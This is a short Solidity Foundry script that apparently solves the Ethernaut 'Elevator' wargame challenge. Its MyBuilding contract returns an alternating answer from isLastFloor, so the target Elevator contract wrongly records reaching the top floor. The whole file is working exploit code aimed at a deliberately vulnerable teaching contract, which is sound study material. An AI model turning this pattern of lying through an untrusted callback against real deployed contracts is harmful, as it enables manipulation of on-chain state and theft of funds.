// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Building, Elevator} from "../src/Elevator.sol";

contract ExploitElevator is Script {
    address private INSTANCE_ADDRESS = 0x68EF7272c92D0B6564e49471E95D8acC296E4C37;
    uint256 private PRIVATE_KEY = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(PRIVATE_KEY);
        MyBuilding myBuilding = new MyBuilding(INSTANCE_ADDRESS);
        myBuilding.takeElevator(10);
        vm.stopBroadcast();
    }
}

contract MyBuilding is Building {
    bool public isTop = true;
    address public immutable INSTANCE_ADDRESS;

    constructor(address instanceAddress) {
        INSTANCE_ADDRESS = instanceAddress;
    }

    function isLastFloor(uint256 _floor) external override returns (bool) {
        if (isTop) {
            isTop = false;
        } else {
            isTop = true;
        }
        return isTop;
    }

    function takeElevator(uint256 _floor) external {
        Elevator(INSTANCE_ADDRESS).goTo(_floor);
    }
}
